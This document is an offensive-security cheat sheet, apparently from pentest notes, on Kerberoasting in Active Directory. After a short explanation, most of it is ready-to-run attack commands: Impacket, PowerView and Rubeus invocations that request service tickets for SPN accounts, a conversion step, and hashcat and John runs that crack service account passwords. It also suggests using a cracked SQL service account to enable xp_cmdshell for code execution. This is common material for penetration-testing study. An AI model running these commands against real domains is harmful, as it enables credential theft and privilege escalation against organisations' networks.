# Kerberoasting

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**Kerberoasting**</mark> is a <mark style="color:purple;">**lateral movement/privilege escalation technique**</mark> in Active Directory environments. This attack targets <mark style="color:red;">**Service Principal Name (SPN)**</mark> accounts.&#x20;

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as <mark style="color:green;">**`NT AUTHORITY\LOCAL SERVICE`**</mark>.&#x20;

> <mark style="color:orange;">**Any domain user can request a Kerberos ticket for any service account in the same domain.**</mark>&#x20;

It works because in Kerberos protocol if you have TGT, KDC implies you are honest domain member, so it can give you ST (which is encrypted with Service Account's password). But then if you would try to access service, Service will check UAC and ACL, and deny you're access. The vulnerability is that any user can ask for TGS, and because of it we can.

***

1. **Look for juicy Kerberoastable account with SPN's to use.**
2. **Extract TGS Tickets.**
3. **Crack it and get a creds (You can't use hash for PtH, only crack it).**

***

This is also possible across forest trusts if authentication is permitted across the trust boundary.&#x20;

If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp\_cmdshell extended procedure and gain code execution on the target SQL server.

### <mark style="color:blue;">Prerequisites</mark>

We could execute Kerberoasting from various setups like (<mark style="color:orange;">**shell / creds are must-have**</mark>):

* Non-domain Linux machine (<mark style="color:green;">**Impacket, netexec, hashcat, john, etc**</mark>).
* Non-domain Windows machine (<mark style="color:yellow;">**using runas /netonly**</mark>).
* Domain-joined Windows machine (<mark style="color:green;">**PowerView, Rubeus, Mimikatz, setspn.exe, etc**</mark>)

## <mark style="color:yellow;">LINUX</mark>

### <mark style="color:blue;">GetUserSPNs</mark>

> <mark style="color:yellow;">**Use**</mark> <mark style="color:green;">`-outputfile`</mark> <mark style="color:yellow;">**parameter for output into a file**</mark>

#### List SPN Accounts

```bash
impacket-GetUserSPNs -dc-ip 13.13.13.13 MILITECH.LOCAL/sol.reed
```

#### Request all TGS Tickets

```bash
impacket-GetUserSPNs -dc-ip 13.13.13.13 MILITECH.LOCAL/sol.reed -request
```

#### Target Specific User

```bash
impacket-GetUserSPNs -dc-ip 13.13.13.13 MILITECH.LOCAL/sol.reed -request-user songbird
```

> With <mark style="color:green;">`-target-domain`</mark> parameter we can do Cross-Forest Kerberoasting

## <mark style="color:yellow;">WINDOWS</mark>

### <mark style="color:blue;">PowerView</mark>

#### Extract TGS Tickets

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> Get-DomainUser * -spn | select samaccountname
```

#### Target Specific User

```powershell
PS C:\> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Extract all Tickets to CSV

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\crack_tgs.csv -NoTypeInformation
```

### <mark style="color:blue;">Rubeus</mark>

#### Stats

```powershell
PS C:\> .\Rubeus.exe kerberoast /stats
```

#### Target High-Value Accounts

```powershell
PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Target Specific User

```powershell
PS C:\> .\Rubeus.exe kerberoast /user:testuser /nowrap # For RC4 only, use /tgtdeleg
```

> With <mark style="color:green;">`-Domain`</mark> parameter we can do Cross-Forest Kerberoasting

## <mark style="color:yellow;">CRACKING</mark>

> <mark style="color:orange;">**IF YOU ARE ON WINDOWS SERVER 2016 OR EARLIER SPECIFY HASH IN RC4 ALGORITHM BECAUSE IT'S EASIER TO CRACK. IF YOU ARE ABOVE 2016's THEN YOU WILL BE DEALING WITH AES ENCRYPTION.**</mark>

> <mark style="color:orange;">**IF HASH BEGINS WITH**</mark> <mark style="color:green;">`$krb5tgs$23$*`</mark> <mark style="color:orange;">**THIS IS RC4 HASH**</mark>&#x20;

#### Checking Supported Encryption Types

```powershell
PS C:\> Get-DomainUser testuser -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

### <mark style="color:blue;">Hashcat</mark>

#### 1. Convert kirbi to Crackable format

```bash
python2.7 kirbi2john.py sqldev.kirbi > crack_tgs_unprocessed
```

#### 2. Modifying file for Hashcat

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_tgs_unprocessed > crack_tgs
```

#### 3. Run Hashcat

```bash
hashcat -m 13100 crack_tgs /usr/share/wordlists/rockyou.txt # 13100 mode is for RC4
```

### <mark style="color:blue;">John</mark>

#### 1. Convert kirbi to Crackable format

```bash
python2.7 kirbi2john.py sqldev.kirbi > crack_tgs
```

#### 2. Run John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack_tgs
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting" %}

{% embed url="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" %}

{% embed url="https://www.youtube.com/watch?v=PUyhlN-E5MU" %}
